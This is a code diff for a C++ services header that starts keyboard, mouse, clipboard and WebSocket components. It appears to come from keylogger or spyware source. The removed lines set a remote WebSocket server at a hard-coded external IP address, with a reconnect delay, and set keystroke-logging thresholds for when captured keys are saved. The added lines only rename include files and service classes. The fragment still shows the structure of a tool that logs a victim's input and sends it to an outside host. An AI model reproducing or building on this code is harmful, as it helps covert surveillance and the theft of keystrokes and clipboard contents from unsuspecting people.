@@ -10,42 +10,11 @@
 #define SERVICE_WEBSOCKET_ENABLED	true
 
 // ---
-// WebSocket settings
-// ---
-
-#if SERVICE_WEBSOCKET_ENABLED
-
-// WebSocket server host
-// #define WS_HOST "ws://localhost:8080/"
-#define WS_HOST "ws://5.58.91.27:25565/"
-
-// After how many seconds server retries to connect
-// after fail
-#define WS_CONNECTION_DELAY_SEC 5
-
-#endif
-
-// ---
-// Keyboard settings
-// ---
-
-#if SERVICE_KEYBOARD_ENABLED
-
-// Amount of keypresses of the same button
-// after which keyboard stops logging it
-#define KBD_MAX_REPEATS 100
-
-// How many times key should be pressed to save data
-#define KBD_KEYS_TO_SAVE 100
-
-#endif
-
-// ---
 // Includes
 // ---
 
-#include "kbdworker.h"
-#include "lrcdatahandler.h"
+#include "kbdworker.hpp"
+#include "lrcdatahandler.hpp"
 
 #if SERVICE_KEYBOARD_ENABLED
 #include "keyboard.hpp"
@@ -68,16 +37,16 @@ namespace Services
 		KeyboardWorker::Run();
 
 #if SERVICE_KEYBOARD_ENABLED
-		Keyboard::Run();
+		KeyboardSvc::Run();
 #endif
 #if SERVICE_MOUSE_ENABLED
-		Mouse::Run();
+		MouseSvc::Run();
 #endif
 #if SERVICE_CLIPBOARD_ENABLED
-		Clipboard::Run();
+		ClipboardSvc::Run();
 #endif
 #if SERVICE_WEBSOCKET_ENABLED
-		WebSocket::Run();
+		WebSocketSvc::Run();
 #endif
 	}
 
@@ -86,16 +55,16 @@ namespace Services
 		KeyboardWorker::Stop();
 
 #if SERVICE_KEYBOARD_ENABLED
-		Keyboard::Stop();
+		KeyboardSvc::Stop();
 #endif
 #if SERVICE_MOUSE_ENABLED
-		Mouse::Stop();
+		MouseSvc::Stop();
 #endif
 #if SERVICE_CLIPBOARD_ENABLED
-		Clipboard::Stop();
+		ClipboardSvc::Stop();
 #endif
 #if SERVICE_WEBSOCKET_ENABLED
-		WebSocket::Stop();
+		WebSocketSvc::Stop();
 #endif
 	}
 }
